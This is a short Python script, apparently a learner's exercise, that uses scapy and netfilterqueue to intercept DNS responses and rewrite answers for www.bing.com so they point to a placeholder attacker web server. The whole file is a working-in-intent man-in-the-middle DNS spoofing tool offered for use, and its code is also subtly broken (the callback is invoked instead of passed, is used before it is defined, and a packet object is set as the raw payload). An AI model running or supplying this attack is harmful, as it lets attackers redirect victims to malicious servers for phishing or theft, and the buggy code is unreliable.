import scapy.all as scapy
import netfilterqueue

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet())   # Bind to queue created
queue.run()

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname     # Retrieve user reqested domain name in variable
        if 'www.bing.com' in qname:
            print('[+] Spoofing target')
            spoofed_answer = scapy.DNSRR(rrname=qname, rdata='[OUR WEBSERVER IP]')
            scapy_packet[scapy.DNS].an = spoofed_answer     # Modify answer field to our spoofed response to be sent
            scapy_packet[scapy.DNS].ancount = 1     # Modify the answer count to the same number of spoofed answers we created

            # Remove checksum fields of IP and UDP layers
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.setpayload(scapy_packet)     # Set modified packet as payload to send
    packet.accept()